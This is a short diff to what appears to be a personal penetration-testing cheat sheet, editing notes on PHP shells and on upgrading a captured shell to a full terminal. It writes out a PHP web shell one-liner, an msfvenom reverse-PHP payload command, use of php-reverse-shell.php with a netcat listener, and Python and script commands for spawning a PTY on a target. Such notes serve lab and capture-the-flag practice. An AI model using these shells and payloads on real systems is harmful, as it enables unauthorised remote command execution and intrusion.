@@ -145,7 +145,7 @@ curl "http://$IP:8080/rev/"       # listener up first
 # PHP shells to upload
 echo '<?php system($_GET["cmd"]); ?>' > cmd.php          # then browse cmd.php?cmd=id
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp <port>, browse it
-msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php  # command-runner, does NOT upgrade to a TTY -- prefer php-reverse-shell.php above
 ```
 
 Reminder: if the browser redirects to a name, `echo "$IP <host>" | sudo tee -a /etc/hosts`.
@@ -272,8 +272,9 @@ Best source for one-liners in a pinch: revshells.com (run it locally, or just re
 ## Upgrade a dumb shell to a full TTY
 
 ```bash
-# 1. ON TARGET: spawn a PTY  (no python3? use:  script -qc /bin/bash /dev/null)
+# 1. ON TARGET: spawn a PTY
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+#   no python3?  python -c 'import pty; pty.spawn("/bin/bash")'   |  neither?  script -qc /bin/bash /dev/null
 
 # 2. press Ctrl-Z  -> drops you to your own Kali prompt
 
